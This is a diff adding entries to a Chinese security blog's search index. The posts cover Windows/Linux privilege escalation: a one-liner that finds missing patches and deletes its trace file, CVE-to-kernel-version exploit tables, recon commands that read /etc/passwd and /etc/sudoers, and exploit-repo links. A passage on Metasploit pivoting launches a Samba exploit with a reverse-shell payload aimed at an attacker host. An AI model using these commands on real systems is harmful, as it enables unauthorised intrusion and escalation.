@@ -1,6 +1,121 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>windows/linux快速提权</title>
+    <url>/2019/11/28/windows-linux%E5%BF%AB%E9%80%9F%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="windows提权-快速查找exp"><a href="#windows提权-快速查找exp" class="headerlink" title="windows提权-快速查找exp"></a>windows提权-快速查找exp</h1><p>微软官方时刻关注列表网址：<br><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a><br><img src="/images/pasted-46.png" alt="upload successful"><br>比如常用的几个已公布的 exp：<br>KB2592799<br>KB3000061<br>KB2592799<br>…<br>快速查找未打补丁的 exp，可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</p><a id="more"></a>
+<pre><code>systeminfo>micropoor.txt&(for %i in (KB977165 KB2160329 KB2503665 KB2592799  KB2707511 KB2829361 KB2850851 KB3000061   KB3045171 KB3077657 KB3079904  KB3134228 KB3143141  KB3141780)do @type micropoor.txt|@find /i "%i"||@echo %i you can fuck)&del /f /q /a micropoor.txt
+</code></pre>
+<p><img src="/images/pasted-47.png" alt="upload successful"><br>注：以上需要在可写目录执行。需要临时生成micrpoor.txt，以上补丁编号请根据环境来增删。<br>上述命令解释：</p>
+<pre><code>首先，cmd中&是连接符（无论前面结果如何都会执行后面语句），那么我们先把这段命令先分成三个部分
+一、systeminfo>micropoor.txt
+二、for %i in (KB977165 KB2160329 KB2503665 KB2592799  KB2707511 KB2829361 KB2850851 KB3000061   KB3045171 KB3077657 KB3079904  KB3134228 KB3143141  KB3141780)do @type micropoor.txt|@find /i "%i"||@echo %i you can fuck
+三、del /f /q /a micropoor.txt
+然而二还是太长了，我们把他通过|(就是enter上面那个键，作用是前面语句的结果作为后面语句的参数)与||(前面的语句没执行成功，执行后一条语句)接着分解
+二、1.for %i in (KB977165 KB2160329 KB2503665 KB2592799  KB2707511 KB2829361 KB2850851 KB3000061   KB3045171 KB3077657 KB3079904  KB3134228 KB3143141  KB3141780)do @type micropoor.txt
+二、2.@find /i "%i"
+二、3.@echo %i you can fuck
+好了，我们来逐条解释
+一、执行systeminfo命令，把内容写入micropoor.txt中
+二、1.就是一个循环，一个形式变量%i，从（exp1，exp2）中遍历，并且显示micropoor.txt的内容
+二、2. /i（不在乎大小写的）在显示的micropoor.txt中查找exp是否存在
+二、3.若该exp不存在于micropoor.txt中，则执行，说明没有exp，可以被利用，则输出 exp you can fuck，若存在于micropoor.txt中，则不执行此命令
+三、强制安静的删除创建的micropoor.txt文件（不留下痕迹）</code></pre>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>一般实战中在类似 tmp 目录等可写目录下执行：如 C:\tmp&gt;<br>以 11-080 为例：<br><img src="/images/pasted-48.png" alt="upload successful"><br><img src="/images/pasted-49.png" alt="upload successful"><br>exp注：<pre><code>MS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7/8)<br>CVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10/8.1/7/2016/2010/2008）<br>CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008)<br>MS17-010 [KB4013389] [Windows Kernel Mode Drivers](windows 7/2008/2003/XP)<br>MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016)<br>MS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32/64)/8.1)<br>MS16-098 [KB3178466] [Kernel Driver] (Win 8.1)<br>MS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012)<br>MS16-034 [KB3143145] [Kernel Driver] (2008/7/8/10/2012)<br>MS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012)<br>MS16-016 [KB3136041] [WebDAV] (2008/Vista/7)<br>MS15-097 [KB3089656] [remote code execution] (win8.1/2012)<br>MS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012)<br>MS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012)<br>MS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012)<br>MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012)<br>MS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8)<br>MS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 R2/2008 R2)<br>MS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8)<br>MS14-070 [KB2989935] [Kernel Driver] (2003)<br>MS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8)<br>MS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8)<br>MS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8)<br>MS14-002 [KB2914368] [NDProxy] (2003/XP)<br>MS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7)<br>MS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7)<br>MS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8)<br>MS12-042 [KB2972621] [Service Bus] (2008/2012/win7)<br>MS12-020 [KB2671387] [RDP] (2003/2008/7/XP)<br>MS11-080 [KB2592799] [AFD.sys] (2003/XP)<br>MS11-062 [KB2566454] [NDISTAPI] (2003/XP)<br>MS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP)<br>MS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista)<br>MS10-092 [KB2305420] [Task Scheduler] (2008/7)<br>MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5)<br>MS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista)<br>MS10-048 [KB2160329] [win32k.sys] (XP SP2 & SP3/2003 SP2/Vista SP1 & SP2/2008 Gold & SP2 & R2/Win7)<br>MS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP)<br>MS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7/2008R2)<br>MS09-050 [KB975517][Remote Code Execution] (2008/Vista)<br>MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0)<br>MS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista)<br>MS08-068 [KB957097] [Remote Code Execution] (2000/XP)<br>MS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008)<br>MS08-066 [KB958644] (Windows 2000/XP/Server 2003)<br>MS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista)<br>MS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000)<br>MS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003)<br>MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (/NT/2000/XP/2003)<br></code></pre><br>已对外公开exp注：<br><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<h1 id="linux提权-依赖exp篇"><a href="#linux提权-依赖exp篇" class="headerlink" title="linux提权-依赖exp篇"></a>linux提权-依赖exp篇</h1><h2 id="基础信息搜集"><a href="#基础信息搜集" class="headerlink" title="基础信息搜集"></a>基础信息搜集</h2><pre><code>（1）：内核，操作系统和设备信息
+uname -a    打印所有可用的系统信息
+uname -r    内核版本
+uname -n    系统主机名。
+uname -m    查看系统内核架构（64位/32位）
+hostname    系统主机名
+cat /proc/version    内核信息
+cat /etc/*-release   分发信息
+cat /etc/issue       分发信息
+cat /proc/cpuinfo    CPU信息</code></pre>
+<pre><code>（2）用户和群组
+cat /etc/passwd     列出系统上的所有用户
+cat /etc/group      列出系统上的所有组
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'      列出所有的超级用户账户
+whoami              查看当前用户
+w                   谁目前已登录，他们正在做什么
+last                最后登录用户的列表
+lastlog             所有用户上次登录的信息
+lastlog –u %username%  有关指定用户上次登录的信息
+lastlog |grep -v "Never"  以前登录用户的完</code></pre>
+<pre><code>（3）用户和权限信息：
+whoami        当前用户名
+id            当前用户信息
+cat /etc/sudoers  谁被允许以root身份执行
+sudo -l       当前用户可以以root身份执行操作</code></pre>
+<pre><code>（4）环境信息
+env        显示环境变量
+set        现实环境变量
+echo %PATH 路径信息
+history    显示当前用户的历史命令记录
+pwd        输出工作目录
+cat /etc/profile   显示默认系统变量
+cat /etc/shells    显示可用的shell</code></pre>
+<p>exp注：</p>
+<pre><code>CVE-2017-1000367 [Sudo] (Sudo 1.8.6p7 - 1.8.20)
+CVE-2017-1000112 [a memory corruption due to UFO to non-UFO path switch]
+CVE-2017-7494 [Samba Remote execution] (Samba 3.5.0-4.6.4/4.5.10/4.4.14)
+CVE-2017-7308 [a signedness issue in AF_PACKET sockets] (Linux kernel through 4.10.6)
+CVE-2017-6074 [a double-free in DCCP protocol] (Linux kernel through 4.9.11)
+CVE-2017-5123 ['waitid()'] (Kernel 4.14.0-rc4+)
+CVE-2016-9793 [a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options]  (Linux kernel before 4.8.14)
+CVE-2016-5195 [Dirty cow] (Linux kernel>2.6.22 (released in 2007))
+CVE-2016-2384 [a double-free in USB MIDI driver]  (Linux kernel before 4.5)
+CVE-2016-0728 [pp_key] (3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13,3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6,3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)
+CVE-2015-7547 [glibc getaddrinfo] (before Glibc 2.9)
+CVE-2015-1328 [overlayfs] (3.13, 3.16.0, 3.19.0)
+CVE-2014-5284 [OSSEC] (2.8)
+CVE-2014-4699 [ptrace] (before 3.15.4)
+CVE-2014-4014 [Local Privilege Escalation] (before 3.14.8)
+CVE-2014-3153 [futex]  (3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1)
+CVE-2014-0196 [rawmodePTY] (2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15)
+CVE-2014-0038 [timeoutpwn] (3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)
+CVE-2013-2094 [perf_swevent] (3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4,3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3,3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9)
+CVE-2013-1858 [clown-newuser] (3.3-3.8)
+CVE-2013-1763 [__sock_diag_rcv_msg] (before 3.8.3)
+CVE-2013-0268 [msr]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.27, 2.6.28,2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37,2.6.38, 2.6.39, 3.0.0,3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6)
+CVE-2012-3524 [libdbus] (libdbus 1.5.x and earlier)
+CVE-2012-0056 [memodipper] (2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0)
+CVE-2010-4347 [american-sign-language] ( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)
+CVE-2010-4258 [full-nelson] (2.6.31, 2.6.32, 2.6.35, 2.6.37)
+CVE-2010-4073 [half_nelson] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36)
+CVE-2010-3904 [rds] (2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)
+CVE-2010-3437 [pktcdvd] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)
+CVE-2010-3301 [ptrace_kmod2] (2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)
+CVE-2010-3081 [video4linux] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33)
+CVE-2010-2959 [can_bcm] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)
+CVE-2010-1146 [reiserfs] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)
+CVE-2010-0415 [do_pages_move] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)
+CVE-2009-3547 [pipe.c_32bit] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.15, 2.6.16, 2.6.17,2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.28, 2.6.29,2.6.30, 2.6.31)
+CVE-2009-2698 [udp_sendmsg_32bit] (2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13,  2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19)
+CVE-2009-2692 [sock_sendpage] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16,2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)
+CVE-2009-2692 [sock_sendpage2] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2,2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15,2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)
+CVE-2009-1337 [exit_notify] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)
+CVE-2009-1185 [udev] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)
+CVE-2008-4210 [ftrex] (2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19,2.6.20, 2.6.21, 2.6.22)
+CVE-2008-0600 [vmsplice2] (2.6.23, 2.6.24)
+CVE-2008-0600 [vmsplice1] (2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1)
+CVE-2006-3626 [h00lyshit] (2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16)
+CVE-2006-2451 [raptor_prctl] (2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17)
+CVE-2005-0736 [krad3] (2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11)
+CVE-2005-1263 [binfmt_elf.c] (Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4)
+CVE-2004-1235 [elflbl] (2.4.29)
+CVE-N/A [caps_to_root]  (2.6.34, 2.6.35, 2.6.36)
+CVE-2004-0077 [mremap_pte] (2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27)</code></pre>
+<p>对外公开exp注：<br><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a><br><a href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/" target="_blank" rel="noopener">https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/</a><br><a href="https://github.com/xairy/kernel-exploits" target="_blank" rel="noopener">https://github.com/xairy/kernel-exploits</a></p>
+]]></content>
+      <categories>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>windows/linux快速提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MSF内网渗透测试技巧</title>
     <url>/2019/11/27/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/</url>
     <content><![CDATA[<h1 id="技巧汇总"><a href="#技巧汇总" class="headerlink" title="技巧汇总"></a>技巧汇总</h1><h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>方法一：<pre><code>meterpreter > run get_local_subnets //获取网段<br>meterpreter > run autoroute -s 172.2.175.0/24 //添加路由<br>meterpreter > run autoroute -p //查看路由<br>meterpreter > run autoroute -d -s 172.2.175.0 //删除网段<br>meterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。<br>meterpreter > background //后台sessions</code></pre><br>方法二：<pre><code>meterpreter> run get_local_subnets #查看网段/子网<br>Local subnet: 192.168.33.0/255.255.255.0<br>meterpreter> background #转入后台运行<br>msf> route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息<br>msf> route print #查看添加的信息<br>msf> use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻<br>msf> set payload linux/x86/shell/reverse_tcp<br>msf> set LHOST 10.10.1.129 #此处为attacking 主机的外网IP<br>msf> set LPORT 8080<br>msf> set RHOST 192.168.33.132 #内网目标主机<br>msf> exploit<br>也可以使用自动式添加路由模块：<br>msf> load auto_add_route<br>msf> exploit</code></pre></p><a id="more"></a>
